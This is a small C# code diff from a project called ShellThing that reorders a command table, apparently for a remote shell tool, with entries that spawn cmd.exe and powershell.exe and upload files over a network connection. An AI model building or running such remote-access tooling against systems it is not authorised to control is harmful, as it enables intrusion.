@@ -15,12 +15,12 @@ namespace ShellThing
         {
             this.connection = connection;
 
-            commands.Add("handoff", new HandoffCommand());
-            //commands.Add("systeminfo", new SystemInfoCommand());
+            commands.Add("help", new HelpCommand(commands));
             commands.Add("shell", new ShellSpawnCommand(@"cmd.exe"));
             commands.Add("powershell", new ShellSpawnCommand(@"powershell.exe"));
-            commands.Add("upload", new UploadCommand());
-            commands.Add("help", new HelpCommand());
+            commands.Add("handoff", new HandoffCommand());
+            //commands.Add("systeminfo", new SystemInfoCommand());
+            commands.Add("upload", new UploadCommand()); 
             // Keep adding commands and their classes to the hashtable here
         }
 
@@ -43,8 +43,8 @@ namespace ShellThing
             {
                 connection.SendData($"Invalid Command: {commandFullString}\n");
             }
-
         }
+
 
         public void ExecuteCommand(ICommand command, string[] commandArguments)
         {
